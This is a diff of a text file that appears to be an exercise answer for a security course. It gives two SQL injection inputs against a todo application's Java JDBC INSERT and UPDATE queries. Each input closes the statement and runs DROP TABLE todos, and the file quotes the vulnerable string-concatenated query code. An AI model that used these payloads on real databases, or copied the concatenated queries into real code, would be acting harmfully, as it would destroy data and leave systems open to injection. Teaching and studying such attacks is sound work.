@@ -1,7 +1,41 @@
 With the following input I managed to commit SQL injection:
-<put your 'solution' here>
-Works both with and without a double quote as the first character:
-Add to this: "VALUES ('" +
-Solution:
-tiiiitle', '112345677777778999', 'ACTIVE');DROP TABLE todos;--
-"tiiiitle', '112345677777778999', 'ACTIVE');DROP TABLE todos;--
+1.By adding a new comment
+"', '', '');DROP TABLE todos;--
+
+2. By updating a new comment
+"' WHERE id = '0';DROP TABLE todos;--
+
+-----------------------------------------------------------------------------------------------
+Soultion 1: By adding a new todoo on the site
+----------------
+Original unprotected code:
+INSERT statement fragment in the original code to be complemented:
+String query = "INSERT INTO todos (title, id, status) " +
+ "VALUES ('"
+  + todo.title + "', '" + todo.id + "', '" + todo.status + "');";
+
+----------------
+User input finishing the Insert statement with empty strings, dropping the table and commenting out
+ what follows of the original code as SQL code:
+String query = "INSERT INTO todos (title, id, status) " +
+"VALUES ('" +
+    "', '', '');DROP TABLE todos;-- + "', '" + todo.id + "', '" + todo.status + "');";;
+
+---------------------------------------------------------------------------------------------------
+Soultion 2: By updating an existing todoo on the site "VALUES ('" +
+"' WHERE id = '0';DROP TABLE todos;--
+---------------
+Original code
+String query = "UPDATE todos SET title = '" + title + "' WHERE id = '" + id + "';";
+---------------
+User input finishing the UPDATE statement with an empty string as ID,
+    dropping the table
+    and commenting out the rest of the original code as SQL code:
+"UPDATE todos SET title = '" +
+    "' WHERE id = '0';DROP TABLE todos;--
++ "' WHERE id = '" + id + "';";
+
+
+---------------------------------------------------------------------------------------------------
+Prevention for both adding and updating a todo by implementing validation before executng the SQL statements
+in the dmWithValidation() method in TodoDaoImplWithJdbc.java
